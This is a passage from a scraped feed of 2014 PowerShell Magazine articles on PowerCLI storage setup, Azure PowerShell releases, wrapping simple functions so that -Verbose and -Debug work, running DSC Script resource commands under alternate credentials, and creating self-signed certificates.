Resource Kit Wave 6 is here!"},{"categories":["Dell","VMware"],"contents":"PCIe Solid State Disk (SSD) devices provides higher IOPS and great sequential read/write speeds. These devices need to be configured before they can be used for Virtual Machine (VM) storage. In this article, we will see how this can be done using PowerCLI cmdlets.\nTypically, there are currently three use cases for PCIe SSDs in VMware ESXi.\n Configuring PCIe SSD as VMFS datastore Configuring PCIe SSD as Host Swap Cache Creating vFlash resource out of the PCIe SSD  Let us dive into the PowerCLI commands that are needed for automating each of these use cases.\nNote: The content of this article is a part of a technical paper published by Dell Hypervisor Engineering team. This paper can be downloaded from Dell Tech Center.\nConfiguring PCIe SSD as VMFS datastore The first step in automation using PowerCLI is to connect to the ESXi server. This is done using the Connect-ViServer cmdlet.\nConnect-VIServer dhcp-10-10-5-111.helab.bdc Once the connection is established, we can use the Get-ScsiLun cmdlet to see all available LUNs on the system.\nThe highlighted device name in the above screen shot shows the PCIe SSD device. We can grab this object alone using the -CanonicalName parameter of the Get-ScsiLun cmdlet.\n$PCIeSSD = Get-ScsiLun -CanonicalName t10* Once we have this object, we can use the New-DataStore cmdlet to add the PCIe SSD to the VMFS datastore.\nThe –Path parameter accepts the full path of the device and –FileSystemVersion designates the VMFS filesystem version in which the device has to be formatted. With VMFS filesystem created on the PCIe SSD device, it’s now possible to host the virtual machines on this datastore.\nConfiguring PCIe SSD as host swap cache In this use case, let us see how we can configure a portion of the PCIe SSD as host swap cache in ESXi. What you see below is a script that is slightly modified from the original version posted by Joe Keegan.\n# Here PCIeSSD is the VMFS datastore created in earlier step $DataStore = Get-Datastore -Name \u0026quot;PCIeSSD\u0026quot; $HostCacheConfigurationSpec = New-Object VMware.Vim.HostCacheConfigurationSpec $HostCacheConfigurationSpec.datastore = New-Object VMware.Vim.ManagedObjectReference $HostCacheConfigurationSpec.datastore.type = \u0026quot;Datastore\u0026quot; $HostCacheConfigurationSpec.datastore.Value = ($DataStore.id).substring(10, 35) The Value field for datastore object should be the ID of the VMFS datastore we created in the earlier step.\nThe size of the host swap cache need to be specified in MB and should be less than or equal to the free space available in the PCIe SSD data store.\n$HostCacheConfigurationSpec.swapSize = 2048  Once we have the required configuration, we can execute the ConfigureHostCache_Task method. For this, we first need to derive the Host Cache Configuration Manager ID. This can be done using the following snippet of code.\n$VMHost = Get-VMHost -Name Server01 $HostCacheConfigurationManager_ID = $VMHost.ExtensionData.ConfigManager $HostCacheConfigurationManager = Get-View -Id $HostCacheConfigurationManager_ID $HostCacheConfigurationManager.ConfigureHostCache_Task($HostCacheConfigurationSpec) | Out-Null This completes the configuration of a portion of the PCIe SSD as the host swap cache.\nPCIe SSD as a vFlash Device For configuring PCIe SSD as a vFlash device, we will need the vSphere Flash Read Cache (vFRC) cmdlets.\nWe can enable the vFRC cmdlets by installing the VMware.VimAutomation.Extensions. Once these extensions are installed, the vFRC cmdlets can be imported by running the following command.\nImport-Module VMware.VimAutomation.Extensions  The following snippet retrieves the SSD device object. This can later be used to add the SSD as a vFlash resource.\n$VMHost1 = Get-VMHost 10.10.5.111 $ssd = $VMHost1 | Get-VMHostDisk | Where { $_.CanonicalName -like \u0026quot;t10*\u0026quot; } The Set-VMHostVFlashConfiguration cmdlet can be used to complete the configuration of the SSD as a vFlash resource.\n$VMHost1 | Get-VMHostVFlashConfiguration | Set-VMHostVFlashConfiguration -AddDevice $ssd The PCIe SSD is now added as a vFlash resource. We can set up reservation for HostSwapCache to 20GB by using the following command:\nSet-VMHostVFlashConfiguration -VFlashConfiguration t10* -SwapCacheReservationGB 20 Once the vFlash resource and HostSwapCache are set up, vFRC can be enabled for VMs. Make a note that in order to leverage vFRC, the VM hardware needs to be upgraded to version 10 (VMX-10).\n$VM = Get-VM \u0026quot;rhel6.3\u0026quot; $disk = Get-HardDisk -VM $VM $conf = Get-HardDiskVFlashConfiguration -HardDisk $disk Set-HardDiskVFlashConfiguration -VFlashConfiguration $conf -CacheSizeGB 10 For more detailed information on these use cases, refer to the Dell technical paper at http://en.community.dell.com/techcenter/extras/m/white_papers/20439058.aspx. This white paper was authored by Dell team members Karan Singh Gandhi, Krishna Prasad, and Avinash Bendigeri.\nKaran Singh Gandhi works at Dell Inc. Bangalore in virtualization domain. Love working on PowerShell scripting and like to contribute more In this domain.\nAvinash Bendigeri works at Dell Inc. Bangalore in virtualization domain. Expertise in virtualization domain and python scripting. Recently started with PowerShell scripting. Would like to contribute more and more.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/19/managing-pcie-ssd-devices-in-vmware-esxi-by-using-powercli-cmdlets/","tags":["Dell","VMware"],"title":"Managing PCIe SSD devices in VMware ESXi by using PowerCLI cmdlets"},{"categories":["Azure","News"],"contents":"Just a few hours ago, Azure PowerShell Tools version 0.8.7 was released. This release includes enhancements to the existing cmdlets.\nHere is what’s updated in this release:\n Updated Newtonsoft.Json dependency to 6.0.4 Compute  Windows Azure Diagnostics (WAD) Version 1.2: extension cmdlets for Iaas And PaaS  Set-AzureVMDiagnosticsExtension Get-AzureVMDiagnosticsExtension Set-AzureServiceDiagnosticsExtension Get-AzureServiceDiagnosticsExtension   Get-AzureDeployment: added CreatedTime and LastModifiedTime to output Get-AzureVM: added Hostname property Implemented CustomData support for Azure VMs   Websites  Added RoutingRules parameter to Set-AzureWebsite to expose Testing in Production (TiP) and returned from Get-AzureWebsite Get-AzureWebsiteMetric to return web site metrics Get-AzureWebHostingPlan Get-AzureWebHostingPlanMetric to return metrics for the servers in the web hosting plan   SQL Database  Get-AzureSqlRecoverableDatabase parameter simplification and return type changes Set-AzureSqlDatabaseRecovery parameter and return type changes   HDInsight  Added support for provisioning of HBase clusters into Virtual Networks.    I will write about the VM diagnostics extension and other enhancements in an upcoming post.\nMeanwhile, you can use the following script to get the most recent MSI downloaded from the Azure PowerShell Tools release page:\nFunction Test-Url { [CmdletBinding()] param ( [Parameter(Mandatory=$true)] [String] $Url ) Process { if ([system.uri]::IsWellFormedUriString($Url,[System.UriKind]::Absolute)) { $true } else { $false } } } Function Get-AzurePowerShellMSI { [CmdletBinding()] param ( [String]$Url = 'https://github.com/Azure/azure-sdk-tools/releases', [Switch]$DownloadLatest, [String]$DownloadPath = \u0026quot;$env:USERPROFILE\\Downloads\u0026quot;, [Switch]$Passthru ) Process { $Msi = @() $doc = Invoke-WebRequest -Uri $Url foreach ($href in ($doc.links.href -ne '')) { if ((Test-Url -Url $href) -and $href.EndsWith('.msi')) { $Msi += New-Object -TypeName PSObject -Property @{ \u0026quot;Url\u0026quot; = $href \u0026quot;Version\u0026quot; = ([Regex]::Match($href,'\\bv?[0-9]+\\.[0-9]+\\.[0-9]+(?:\\.[0-9]+)?\\b')).Value } } } if ($DownloadLatest) { if (-not (Test-Path $DownloadPath -PathType Container)) { Write-Warning \u0026quot;${DownloadPath} does not exist. Creating it ...\u0026quot; New-Item -Path $DownloadPath -ItemType Directory -ErrorAction Stop | Out-Null } $MsiToInstall = $msi | Sort -Property Version -Descending | Select -First 1 $MsiFullPath = \u0026quot;${DownloadPath}\\$(Split-Path -Path $MsiToInstall.Url -Leaf)\u0026quot; if (-not (Test-Path -Path $MsiFullPath)) { Write-Verbose \u0026quot;Starting MSI download from $($MsiToInstall.Url)\u0026quot; Start-BitsTransfer -Source $MsiToInstall.Url -Destination $MsiFullPath -ErrorAction Stop } else { Write-Warning (\u0026quot;{0} already exists at {1}. No action needed.\u0026quot; -f $MsiFileName, $DownloadPath) } if ($Passthru) { return $MsiFullPath } } else { $Msi } } } This is a simple function and can be used in the following manner:\n#get a list of all MSIs Get-AzurePowerShellMSI -Passthru #Download the latest MSI Get-AzurePowerShellMSI -DownloadLatest -Verbose -Passthru #Download the latest MSI to a specific destination Get-AzurePowerShellMSI -DownloadLatest -DownloadPath C:\\MyDownloads1 -Verbose -Passthru ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/19/azure-powershell-tools-0-8-7-is-available/","tags":["Azure","News"],"title":"Azure PowerShell Tools 0.8.7 is available"},{"categories":["News"],"contents":"I am very happy to announce that Bartek Bielawski joined the PowerShell Magazine editorial board. Bartek is a multi-year recipient of Microsoft MVP award for Windows PowerShell. Bartek works at Optiver as a Windows Engineer and needless to say, he loves PowerShell. I have known Bartek for more than 5 years and have been following his blog posts for a long time. If you have not already read about OMI and Linux, Bartek is the only PowerShell MVP who had written a series of articles on OMI and how PowerShell can be used to manage Linux systems. There are many such examples of his expertise in not just PowerShell but many aspects of Windows OS and management. I learned a lot from him over years and will continue to in the years forward.\nI have had the pleasure to personally meet Bartek at TEC 2011 in Germany and I am very happy to have him join us here at the PowerShell Magazine. He has already been an active contributor at PowerShell Magazine and I am also happy to announce that he decided to write exclusively here. Thank you Bartek and we are looking forward to great content from you as usual!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/18/bartek-bielawski-joins-powershell-magazine-editorial-board/","tags":["News"],"title":"Bartek Bielawski joins PowerShell Magazine editorial board"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or later.\nIn the final part of the series, we will combine everything we’ve found out so far and create a tool that will identify any command that needs to be wrapped by advanced function in order to make access to verbose and debug messages easy and natural.\nNote: You can find a function here.\nOur function will take only one parameter, (-Name), but will validate it extensively using knowledge we already have. First of all, it will check if command exists. Then, it will check if command is already advanced and if it is, there is no need to wrap it. Next we check command’s Abstract Syntax Tree (AST) to see if Write-Verbose or Write-Debug are present. If these commands are absent, we also won’t proceed. Entire param() block:\nparam ( [Parameter(Mandatory = $true)] [ValidateScript({ $command = Get-Command -Name $_ -ErrorAction Stop if ($command.CmdletBinding) { throw 'This is already an advanced command.' } $astVerboseOrDebug = $command.ScriptBlock.Ast.FindAll( { $args[0] -is [System.Management.Automation.Language.CommandAst] -and $args[0].CommandElements[0].Value -match '^Write-(Verbose|Debug)$' }, $true ) if (-not $astVerboseOrDebug) { throw 'No need to turn into advanced: Write-Debug and Write-Verbose not used.' } $true })] [String]$Name )  We filtered out commands that require additional processing and it is time to apply a fix. Depending on the command type, we will either prefix whole name (for scripts) or noun (for functions). Also, AST check for pipeline-friendliness will be different depending on the command type. We will use a Switch statement for that.\n$commandInfo = Get-Command @PSBoundParameters switch ($commandInfo.CommandType) { ExternalScript { $isPipelineFriendly = [bool]$commandInfo.ScriptBlock.Ast.ProcessBlock $newName = $commandInfo.Name -replace '^', 'Invoke-' } Function { $isPipelineFriendly = [bool]$commandInfo.ScriptBlock.Ast.Body.ProcessBlock $newName = $commandInfo.Name -replace '-', '-Advanced' } } If a wrapped command is marked as ‘pipeline-friendly’, we have to modify parameter block.\n$paramBlock = [System.Management.Automation.ProxyCommand]::GetParamBlock($commandInfo) if ($isPipelineFriendly) { $inputParameter = @' [Parameter(ValueFromPipeline = $true)] [System.Object] ${InputObject} '@ if ($paramBlock) { $paramBlock = $paramBlock, $inputParameter -join ',' } else { $paramBlock = $inputParameter } } We also need to define body of the function. This will be different depending on whether the command is pipeline-friendly or not. We will use formatting operator (-f). Therefore, we have to be careful with curly brackets (we have double them whenever they should be taken literally):\nif ($isPipelineFriendly) { $body = @' begin {{ Write-Verbose 'Removing InputObject from PSBoundParameters' $PSBoundParameters.Remove('InputObject') | Out-Null }} process {{ Write-Verbose 'Running {0} with $InputObject as pipeline input and PSBoundParameters' $InputObject | {0} @PSBoundParameters }} '@ } else { $body = @' Write-Verbose \u0026quot;Calling {0} with parameters passed.\u0026quot; {0} @PSBoundParameters '@ } We have all building blocks and we just have to generate our command. Because we want to use created command after function completes, we will create it in ‘global’ scope:\n$body = $body -f $commandInfo.Name $scriptText = @\u0026quot; [CmdletBinding()] param ( $paramBlock ) $body \u0026quot;@ $scriptBlock = [scriptblock]::Create($scriptText) New-Item -Path function:\\Global:$newName -Value $scriptBlock -Force This function can be used to wrap any function or script to enable -Verbose and -Debug parameters. We just need to specify the name of the target command and we will get updated, advanced function. No more secret verbose and debug outputs!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/15/pstip-taking-control-of-verbose-and-debug-output-part-5/","tags":["Tips and Tricks"],"title":"#PSTip Taking control of verbose and debug output, part 5"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or later.\nPowerShell commands, both advanced and simple, can work with the pipeline. The difference is that in the simple commands access to pipeline is implicit with $_ automatic variable. In advanced commands, we have to explicitly specify which parameter will access pipeline and decide what type of binding we want to use. Because of this difference wrapping any simple command in advanced function without adding explicit pipeline-aware parameter(s) won’t work.\nfunction Test-AdvancedPipeline { [CmdletBinding()] param ( [String]$Value ) process { $Value * $_ } } 1, 2, 3 | Test-AdvancedPipeline -Value Test The input object cannot be bound to any parameters for the command either because the command does not take pipeline input or the input and its properties do not match any of the parameters that take pipeline input. (raised by: Test-AdvancedPipeline). The input object cannot be bound to any parameters for the command either because the command does not take pipeline input or the input and its properties do not match any of the parameters that take pipeline input. (raised by: Test-AdvancedPipeline). The input object cannot be bound to any parameters for the command either because the command does not take pipeline input or the input and its properties do not match any of the parameters that take pipeline input. (raised by: Test-AdvancedPipeline) Error message suggests that even though there is pipeline input, our command doesn’t know how to use it. This means that if we want to make our wrapper commands fully functional, we have to take this into account. We can go back to Abstract Syntax Tree (AST) to find out if the function can work with pipeline or not. This can be identified by checking if Process block contains any statements. For example: we have two functions that look like they were written with pipeline in mind. One is missing the Process block though so it’s not really using pipeline:\nfunction Test-SimpleWithProcess { param ( [Int]$Times = 1 ) process { Write-Verbose \u0026quot;Piped: $_\u0026quot; $_ * $Times } } function Test-SimpleNoProcess { param ( [Int]$Times = 1 ) Write-Verbose \u0026quot;I think I can use pipeline but it's: [$_] \u0026amp;lt;-- empty!\u0026quot; $_ * $Times } Our test that will identify if function can access pipeline:\nGet-Command Test-Simple*Process | Where-Object { [bool]$_.ScriptBlock.Ast.Body.ProcessBlock } CommandType Name Source ----------- ---- ------ Function Test-SimpleWithProcess If we would like to create correct wrapper function, we need to do a few additional things. First of all, we have to add pipeline parameter: (-InputObject). We need to verify if original command had any parameters and if that was the case, we have to separate our new parameter and old parameters with comma:\n$meta = Get-Command Test-SimpleWithProcess $paramBlock = [System.Management.Automation.ProxyCommand]::GetParamBlock($meta) $originalName = $meta.Name $inputParameter = @' [Parameter(ValueFromPipeline = $true)] [System.Object] ${InputObject} '@ if ($paramBlock) { $paramBlock = $paramBlock, $inputParameter -join ',' } else { $paramBlock = $inputParameter } With that done, we can define Begin block (where we will remove -InputObject parameter from $PSBoundParameters collection) and define Process block where we will pipe $InputObject to wrapped command. We will also create a script block from these building blocks:\n$scriptBlock = [scriptblock]::Create(@\u0026quot; [CmdletBinding()] param ( $paramBlock ) begin { Write-Verbose 'Removing InputObject from PSBoundParameters' `$PSBoundParameters.Remove('InputObject') | Out-Null } process { Write-Verbose \u0026quot;Running $originalName with `$InputObject as pipeline input and PSBoundParameters\u0026quot; `$InputObject | $originalName @PSBoundParameters } \u0026quot;@) With script block created we can go ahead and define new function. Again, we will use New-Item cmdlet and function: PowerShell drive.\n$wrapperName = $meta.Name -replace '-', '-Advanced' New-Item -Path function:\\$wrapperName -Value $scriptBlock -Force CommandType Name Source ----------- ---- ------ Function Test-AdvancedSimpleWithProcess If we pipe anything to our wrapper function now it will just work:\n1,2,3 | Test-AdvancedSimpleWithProcess -Times 3 -Verbose VERBOSE: Removing InputObject from PSBoundParameters VERBOSE: Running Test-SimpleWithProcess with 1 as pipeline input and PSBoundParameters VERBOSE: Piped: 1 3 VERBOSE: Running Test-SimpleWithProcess with 2 as pipeline input and PSBoundParameters VERBOSE: Piped: 2 6 VERBOSE: Running Test-SimpleWithProcess with 3 as pipeline input and PSBoundParameters VERBOSE: Piped: 3 9 We have all we needed except for actual tool that will look for commands with these kind of issues and apply our ‘fix’ automatically. This will be our goal in next and final part of this series.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/14/pstip-taking-control-of-verbose-and-debug-output-part-4/","tags":["Tips and Tricks"],"title":"#PSTip Taking control of verbose and debug output, part 4"},{"categories":["PowerShell DSC"],"contents":"A while ago, I received an email from a reader who wanted to run a few Exchange PowerShell cmdlets using DSC. DSC runs as SYSTEM and using Exchange cmdlets will result in an access denied error because SYSTEM won’t be a part of Exchange administration security groups. So, we need to be able to pass credentials to run those cmdlets as an Exchange administrator. Given this context, the first thought would be to create a new custom resource but given the number of configuration settings Exchange has, it would be overwhelming to create such granular resources. The immediate alternative is to use the DSC script resource. Using the Script resource, we can run any ad hoc script block on the target systems. I use the Script resource as a prototyping mechanism when starting custom DSC resource development. There are a few glitches with this though.\nScript resource and parameters The values provided as arguments to the GetScript, SetScript, and TestScript properties get converted to a string when the configuration MOF gets generated. There is no a variable expansion done in these script blocks. Here is an example:\nConfiguration DemoConfig { param ( $name ) Node WSR2-1 { Script DemoScript { GetScript = { #Do Nothing } SetScript = { Write-Verbose -Message $name } TestScript = { $false } } } } DemoConfig -Name \u0026quot;PowerShell\u0026quot;  When we enact this configuration, we see an error.\nIt is evident from the error message that the value of the variable $name did not get expanded in the SetScript property. If you still need a proof, you can open the MOF file and check its contents. You will see that the values provided as the arguments to Script resource properties simply get converted to string with no variable expansion done inside them.\n/* @TargetNode='WSR2-1' @GeneratedBy=Administrator @GenerationDate=08/13/2014 15:31:46 @GenerationHost=DEMO-AD */ instance of MSFT_ScriptResource as $MSFT_ScriptResource1ref { ResourceID = \u0026quot;[Script]DemoScript\u0026quot;; GetScript = \u0026quot;\\n #Do Nothing\\n \u0026quot;; TestScript = \u0026quot;\\n $false\\n \u0026quot;; SourceInfo = \u0026quot;::6::9::Script\u0026quot;; SetScript = \u0026quot; \\n Write-Verbose -Message $name\\n \u0026quot;; ModuleName = \u0026quot;PSDesiredStateConfiguration\u0026quot;; ModuleVersion = \u0026quot;1.0\u0026quot;; }; instance of OMI_ConfigurationDocument { Version=\u0026quot;1.0.0\u0026quot;; Author=\u0026quot;Administrator\u0026quot;; GenerationDate=\u0026quot;08/13/2014 15:31:46\u0026quot;; GenerationHost=\u0026quot;DEMO-AD\u0026quot;; }; So, one workaround is to hardcode these variable values inside the Script resource properties or dynamically generate the script blocks used for GetScript, SetScript, and TestScript. Dave Wyatt shows this second method as an example here. So, I won’t repeat it. For now and for demonstration purposes, we will hard-code the values. If you enact this configuration, you will see the word PowerShell in the verbose output from the Start-DscConfiguration cmdlet.\nConfiguration DemoConfig { Node WSR2-1 { Script DemoScript { GetScript = { #Do Nothing } SetScript = { Write-Verbose -Message \u0026quot;PowerShell\u0026quot; } TestScript = { $false } } } } DemoConfig  Running commands as another user Coming to the subject of this article, to run commands as another user, we can use the Invoke-Command cmdlet. However, we need to pass the credentials of the user. We just saw that it is not possible to expand variables inside SetScript. So, instead of passing the credentials as a variable, we need to construct those credentials from plain text. To really prove that we are using alternate credentials, I am using whoami command inside the Invoke-Command script block. This should return the username of the account used to run the command.\nConfiguration DemoConfig { Node WSR2-1 { Script DemoScript { GetScript = { #Do Nothing } SetScript = { $secpasswd = ConvertTo-SecureString \u0026quot;Dell1234\u0026quot; -AsPlainText -Force $mycreds = New-Object System.Management.Automation.PSCredential (\u0026quot;Administrator\u0026quot;, $secpasswd) $output = Invoke-Command -ScriptBlock { $(whoami) } -ComputerName localhost -Credential $mycreds -Verbose Write-Verbose $output } TestScript = { $false } } } } DemoConfig  When we enact this, we will see that the alternate credentials are used to run Invoke-Command script block instead of SYSTEM account.\nYou can replace the value of -Scriptblock parameter of the Invoke-Command cmdlet to execute whatever you need to run as a different user. This is easy! But, do I recommend using plain text credentials in a configuration script? No! You should always encrypt the credentials when using DSC and that is the subject of our next article. Stay tuned.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/13/running-commands-as-another-user-using-dsc-script-resource/","tags":["PowerShell DSC"],"title":"Running commands as another user using DSC script resource"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or later.\nIn the first two tips of this series we focused on the problem. It is time to implement a solution. The assumption here is simple. We want to fix any command that uses Write-Verbose or Write-Debug and make sure we can use common parameters to enable these outputs. Rather than modifying the source code, we will try to generate wrapper around original command that will preserve its parameters and at the same time make it ‘advanced’. First we define command that we will use for testing:\nfunction Test-SimpleParam { param ( [string]$Text = 'test', [int]$Times = 1 ) Write-Verbose \u0026quot;Creating string with $Text times $Times\u0026quot; $Text * $Times } Test-SimpleParam -Text [My-Test] -Times 3 -Verbose [My-Test][My-Test][My-Test] How can we fix it and see verbose output when requested? PowerShell 2.0 introduced concept of proxy commands. We could create such proxy command for our simple function, but it may be a bit too much: it would add additional level of complexity without any actual benefit. Instead, we will only ‘capture’ parameters using helper class [System.Management.Automation.ProxyCommand]:\n$meta = Get-Command Test-SimpleParam $paramBlock = [System.Management.Automation.ProxyCommand]::GetParamBlock($meta)  With param() block captured we can create a script block that will be used as a body of our wrapper function:\n$originalName = $meta.Name $scriptBlock = [scriptBlock]::Create(@\u0026quot; [CmdletBinding()] param ( $paramBlock ) Write-Verbose \u0026quot;Calling $originalName with parameters passed.\u0026quot; $originalName @PSBoundParameters \u0026quot;@) Finally we can create function. We will do that using New-Item cmdlet with function: drive:\n$wrapperName = $meta.Name -replace '-', '-Advanced' New-Item -Path function:\\$wrapperName -Value $scriptBlock -Force CommandType Name Source ----------- ---- ------ Function Test-AdvancedSimpleParam If we try to call our wrapper function with the same parameters we have used on the original one we will get expected results:\nTest-AdvancedSimpleParam -Text [My-Test] -Times 3 -Verbose VERBOSE: Calling Test-SimpleParam with parameters passed. VERBOSE: Creating string with [My-Test] times 3 [My-Test][My-Test][My-Test] We got verbose output from both sources–external and internal function. It will work fine for any simple command with one exception. If a command can take pipeline input (using $_ variable) wrapping it the way we just did will break the pipeline functionality. In the next tip, we will find a way to create wrappers also for this kind of commands.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/13/pstip-taking-control-of-verbose-and-debug-output-part-3/","tags":["Tips and Tricks"],"title":"#PSTip Taking control of verbose and debug output, part 3"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or later.\nIn the first part of this series, we identified the problem–commands (scripts or functions) that ‘partially’ support verbose and debug messages. And the solution we identified was to make sure any command that you write is ‘advanced’ and supports common parameters (in a similar fashion that cmdlets support them). In this tip, we will try to narrow the scope of our test to commands that use verbose and/or debug output.\nThe idea is simple. If a command doesn’t use Write-Verbose and Write-Debug, it can remain ‘simple’ and will behave as expected anyway. There are a few ways to approach this. We can use regular expressions or PowerShell parser. Neither is optimal and should probably be used only if we are ‘stuck’ with PowerShell 2.0. In PowerShell 3.0 we can test command structure using its Abstract Syntax Tree (AST). AST has FindAll() method that will help us find any appearance of Write-Verbose/Write-Debug:\nGet-Command -CommandType Function, ExternalScript | Where-Object { ($_.ScriptBlock.Ast.FindAll( { $args[0] -is [System.Management.Automation.Language.CommandAst] -and $args[0].CommandElements[0].Value -match '^Write-(Verbose|Debug)$' }, $true )) -and -not ($_.CmdletBinding) } CommandType Name Source ----------- ---- ------ Function Test-SimpleWithVerbose Function Test-Simple TestVerbose Function Test-SimpleNested TestVerbose Function Test-SimpleParam TestVerbose Function Test-SimpleSubExpression TestVerbose ExternalScript FakeDebug.ps1 e:\\PATH\\FakeDebug.ps1 How does it work? The FindAll() method takes two arguments. The first argument is a script block that will be used to analyze any AST element present in command syntax tree. In this script block, $args[0] represents syntax element. We check if element is a command and if the command name is Write-Verbose or Write-Debug. The second argument is used to decide if search should be recursive or not. This method returns any element of AST for which script block returned $true. If we find Write-Verbose or Write-Debug then the second test will filter out any ‘advanced’ commands. The advantage of using AST is that it finds commands anywhere, including nested functions and sub-expressions inside double quotes:\nfunction Test-SimpleSubExpression { \u0026quot;$(Write-Verbose test)\u0026quot; } function Test-SimpleNested { function Helper { Write-Verbose Helping } Helper } In my opinion though, there is no extra cost of making command ‘advanced’. Any function that is exported from a module is perfect candidate for ‘advanced’ function. However, if we want to fix commands without modifying the source, (e.g. 3rd-party module) being able to identify commands that require such update can limit amount of work. We will try to do that in the next parts of this series.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/12/pstip-taking-control-of-verbose-and-debug-output-part-2/","tags":["Tips and Tricks"],"title":"#PSTip Taking control of verbose and debug output, part 2"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or later.\nOne of the PowerShell features that makes writing scripts and functions easier is ability to produce different types of output. We can generate errors, warnings, verbose, and debug messages. For warnings and errors, we don’t have to do anything extra. By default, both are presented to users. The verbose and debug messages are different. A user has to enable these messages first. This is expected and logical behavior. A user runs a command with a goal to get results back. If we don’t provide a user with an easy way to enable verbose and debug output, it may remain ‘secret’ and, eventually, it will be ignored.\nIn this series of tips, we will try to see different ways to check if commands (scripts or functions) that we’ve written, or have taken from someone else, make it easy for the user to control the verbose and debug output and explore the ways to fix it (even if we can’t modify source of the command).\nThe verbose messages, generated with the Write-Verbose cmdlet, are used when something doesn’t work as expected, or when a user wants to understand how a command works. The debug messages, generated with Write-Debug, on the other hand are used (as the name suggests) during debugging of a command.\nWhen working with cmdlets enabling verbose or debug output is easy: these commands have common switch parameters that can be used to do that. We can enable this functionality for scripts and functions too. We just need [CmdletBinding()] attribute on param() block, or we have to use [Parameter()] attribute on one of the parameters specified. Either way, we will turn our command into ‘advanced’. The problem with this approach is, if we don’t enable the advanced function features, our ‘simple’ function or script will silently accept any parameters, even if these parameters don’t exist on our command.\nfunction Test-FakeParameter { param ( $First ) \u0026quot;First is: $First\u0026quot; \u0026quot;Second is: $Second\u0026quot; } Test-FakeParameter -Second test First is: Second is: If user will try to use -Verbose switch on ‘simple’ command nothing will happen: there is neither error, nor verbose output:\nfunction Test-SimpleWithVerbose { param ($First) Write-Verbose \u0026quot;You specified: $First\u0026quot; \u0026quot;First is: $First\u0026quot; } Test-SimpleWithVerbose -Verbose -First Test First is: Test This is confusing. To actually enable verbose output for such command, user would have to change $VerbosePreference variable in current scope:\n$VerbosePreference = 'Continue' Test-SimpleWithVerbose -First Test VERBOSE: You specified: Test First is: Test Does it work? Yes. Is it best approach for this problem? I don’t think so. Instead, it would be a good idea to make sure that commands we produce are ‘advanced’ (and by extension: they will produce verbose output if user requests it with -Verbose switch). For example: to check if any of functions from given module is not ‘advanced’ we can use following command:\nGet-Command -Module TestVerbose -CommandType Function | Where-Object { -not $_.CmdletBinding } CommandType Name Source ----------- ---- ------ Function Test-NoVerbose TestVerbose Function Test-Simple TestVerbose Function Test-SimpleNested TestVerbose Function Test-SimpleParam TestVerbose Function Test-SimpleSubExpression TestVerbose In the next tip, we will make our test more granular. If you look closely at the output from the last command, there is one function in TestVerbose module that probably doesn’t have to be advanced to work properly (I would argue though that there is no reason to keep it ‘simple’). After that we will try to ‘fix’ commands that we can’t fully control.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/11/pstip-taking-control-of-verbose-and-debug-output-part-1/","tags":["Tips and Tricks"],"title":"#PSTip Taking control of verbose and debug output, part 1"},{"categories":["Tips and Tricks"],"contents":"Self-signed certificates might be needed for different purposes, such as the test environments. A more practical example is Azure Recovery Services where self-signed certificates can be used as vault certificates.\nMany online articles suggests using the MakeCert.exe tool available in the Windows SDK for creating a self-signed certificate, but now there is an easier approach available.\nIntroduced in Windows 8.1 and Windows Server 2012 R2, the Public Key Infrastructure (PKI) Client module offers the New-SelfSignedCertificate cmdlet to create a self-signed certificate.\nNew-SelfSignedCertificate -DnsName test.powershellmagazine.com -CertStoreLocation cert:\\LocalMachine\\My ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/08/pstip-generating-a-self-signed-certificate/","tags":["Tips and Tricks"],"title":"#PSTip Generating a self-signed certificate"},{"categories":["Azure","PowerShell DSC"],"contents":"In one of the earlier articles, I demonstrated how we can use the Azure VM custom script extension to bootstrap DSC LCM meta-configuration after creating a new VM. In that process, we upload a .PS1 file containing the configuration to a storage container and then use the custom script extension to execute that configuration. Within the configuration script, we had to work around some of the issues pertaining to certificate subject name (when using WinRM HTTPS endpoint in Azure VM) and so on using CIM sessions. While all this is trivial, the biggest disadvantage is that there is no explicit support for finding custom DSC resources required for the configuration and pushing them to the Azure VM. This is where the new Azure VM DSC extension makes a difference.\nWith the release of Azure VM DSC extension, the process of bootstrapping both LCM meta-configuration and other resource configuration becomes very easy. Let us see that process.\nBootstrapping LCM meta-configuration For this demonstration, I will use the following LCM meta-configuration script.\nConfiguration LCMConfiguration { Node Localhost { LocalConfigurationManager { RebootNodeIfNeeded = $true } } }  All we are doing in this configuration script is changing the RebootNodeIfNeeded property. This can be enacted as a part of Azure VM creation using the method shown below.\n#Set the Azure subscription $SubscriptionName = \u0026quot;MyCloud\u0026quot; Select-AzureSubscription -SubscriptionName $SubscriptionName #Replace the variable values as needed $ServiceName = \u0026quot;psdsc\u0026quot; $Location = \u0026quot;Southeast Asia\u0026quot; $VMName = \u0026quot;CSETest\u0026quot; $StorageAccount = 'psdsc' $StorageKey = 'storagekey' $StorageContainer = 'dscarchives' #Get the OS image reference $ImageName = (Get-AzureVMImage | Where { $_.ImageFamily -eq \u0026quot;Windows Server 2012 R2 Datacenter\u0026quot; } | sort PublishedDate -Descending | Select-Object -First 1).ImageName #Create VM Config $vmConfig = New-AzureVMConfig -Name $VMName -ImageName $ImageName -InstanceSize Small #Create Provisioning Configuration $vmProvisioningConfig = Add-AzureProvisioningConfig -VM $vmConfig -Windows -AdminUsername \u0026quot;AdminUser\u0026quot; -Password \u0026quot;P@ssw0rd\u0026quot; $StorageContext = 